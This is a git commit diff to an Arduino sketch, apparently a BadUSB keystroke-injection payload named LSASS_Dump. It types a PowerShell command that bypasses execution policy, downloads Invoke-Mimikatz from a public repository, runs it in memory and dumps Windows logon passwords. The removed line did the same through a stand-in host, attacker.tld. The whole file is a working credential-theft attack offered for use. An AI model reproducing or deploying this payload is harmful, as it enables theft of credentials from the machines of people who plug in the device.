a899575cde07ae77822cd12e9bc6f6415ed20236
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-01-31 19:52:28 +0330

    Update LSASS_Dump.ino

--- sketches/LSASS_Dump.ino
+++ sketches/LSASS_Dump.ino
@@ -5,6 +5,14 @@ void setup() {
   Keyboard.begin();
   delay(3000);
   
-  // دانلود و اجرای Mimikatz در مموری (بدون ذخیره روی دیسک)
-  Keyboard.println(F("powershell -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; iex(irm http://attacker.tld/mimikatz.ps1); Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'"));
+  // اجرای Mimikatz در مموری (بدون ذخیره روی دیسک)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // دانلود و اجرای مستقیم از طریق PowerShell
+  Keyboard.println(F("powershell -ep bypass -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex(iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords' -Force\""));
 }
+
+void loop() {}
